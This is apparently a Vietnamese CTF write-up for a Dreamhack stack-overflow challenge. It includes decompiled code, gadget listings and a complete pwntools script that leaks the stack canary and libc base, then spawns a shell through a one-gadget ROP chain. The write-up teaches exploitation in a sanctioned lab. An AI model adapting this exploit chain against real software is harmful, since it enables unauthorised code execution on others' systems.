# Challenge: ROP

## Vấn đề
- [File challenge](https://github.com/haiwh07/CTFWriteUp/blob/main/dreamhack/rop_0/rop)
- Khi thực thi, chương trình cho 2 lần nhập input và exit.
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[56]; // [rsp+0h] [rbp-40h] BYREF
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 0);
  puts("[1] Leak Canary");
  write(1, "Buf: ", 5u);
  read(0, buf, 0x100u);
  printf("Buf: %s\n", buf);
  puts("[2] Input ROP payload");
  write(1, "Buf: ", 5u);
  read(0, buf, 0x100u);
  return 0;
}
```
- Checksec:
```
+ Arch:       amd64-64-little
+ RELRO:      Partial RELRO
+ Stack:      Canary found
+ NX:         NX enabled
+ PIE:        No PIE (0x400000)
+ Stripped:   No
```
> Khi nhìn sơ qua challenge thì chall này tương tự như [chall](https://github.com/haiwh07/CTFWriteUp/blob/main/dreamhack/basic_ropx64/README.md) mình đã từng giải trước đó.

## Giải pháp
- Vấn đề của chall này là cần leak thêm canary ra trước khi leak puts got.
- Và khi leak đủ dữ liệu thì chỉ cần dùng kỹ thuật one gadget giống chall trước đó đã giải.

## Quá trình
- Để leak được canary, ta cần tính offset tới canary và overwrite 1 bytes và có thể leak dữ liệu.
```
sa(b'Buf: ', b'A'*0x38 + b'A')
p.recvuntil(b'A'*0x38)
canary_leak = u64(p.recv(8).ljust(8, b'\0'))
info("Canary: " + hex(canary_leak & ~0xff))
```
- Kiểm tra kỹ thuật one gadget, ta có được dữ liệu sau:
```
└─$ one_gadget libc.so.6 
0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebd52 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xebda8 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebdaf execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebdb3 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
```
- Kiểm tra luôn ROPgadget, ta có dữ liệu sau:
```
└─$ rop rop_patched pop              
[*] Đang tìm 'pop' trong rop_patched...
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: rop_patched
0x000000000040084c: pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040084e: pop r13; pop r14; pop r15; ret; 
0x0000000000400850: pop r14; pop r15; ret; 
0x0000000000400852: pop r15; ret; 
0x000000000040066d: pop rax; adc byte ptr [rax], ah; jmp rax; 
0x000000000040066d: pop rax; adc byte ptr [rax], ah; jmp rax; nop dword ptr [rax + rax]; pop rbp; ret; 
0x00000000004006af: pop rax; adc byte ptr [rax], ah; jmp rax; nop dword ptr [rax]; pop rbp; ret; 
0x000000000040066b: pop rbp; mov edi, 0x601058; jmp rax; 
0x000000000040066b: pop rbp; mov edi, 0x601058; jmp rax; nop dword ptr [rax + rax]; pop rbp; ret; 
0x00000000004006ad: pop rbp; mov edi, 0x601058; jmp rax; nop dword ptr [rax]; pop rbp; ret; 
0x000000000040084b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040084f: pop rbp; pop r14; pop r15; ret; 
0x0000000000400678: pop rbp; ret; 
0x0000000000400853: pop rdi; ret; 
0x0000000000400851: pop rsi; pop r15; ret; 
0x000000000040084d: pop rsp; pop r13; pop r14; pop r15; ret;
```
- Thì vấn đề cả 2 dữ liệu trên đều giống hệt chall đã từng giải do đó khi đã leak được canary thì chỉ cần dùng kỷ thuật one gadget để lấy shell.
> Chi tiết cách sử dụng kỹ thuật one gadget xem qua [chall này](https://github.com/haiwh07/CTFWriteUp/blob/main/dreamhack/basic_ropx64/README.md).

## Script
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('rop_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+204
        c
        b*main+130
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 11924)
else:
    p = process([exe.path])
GDB()
########################################
### STAGE 1: Leak canary + Leak libc ###
########################################
sa(b'Buf: ', b'A'*0x38 + b'A')
p.recvuntil(b'A'*0x38)
canary_leak = u64(p.recv(8).ljust(8, b'\0'))
info("Canary: " + hex(canary_leak & ~0xff))

pop_rdi = 0x0000000000400853
payload1 = flat(
    b'A'*0x38,
    canary_leak & ~0xff,
    0,
    pop_rdi,
    exe.got['puts'],
    exe.plt['puts'],
    exe.sym['main'],
    )
sa(b'Buf: ', payload1)

puts_leak = u64(p.recv(6).ljust(8, b'\0'))
libc.address = puts_leak - libc.sym['puts']
info("Puts leak: " + hex(puts_leak))

#####################################
### STAGE 2: Overwrite One Gadget ###
#####################################
payload2 = flat(
    b'A'*0x38,
    canary_leak & ~0xff,
    )
sa(b'Buf: ', payload2)
rw_section = 0x601080 + 0x48
pop_vus = 0x000000000040084b
one_gadget = libc.address + 0xebd52
payload3 = flat(
    b'A'*0x38,
    canary_leak & ~0xff,
    0,
    pop_vus,
    rw_section,
    0,
    0,
    0,
    0,
    one_gadget,
    )
sa(b'Buf: ', payload3)

p.interactive()
```
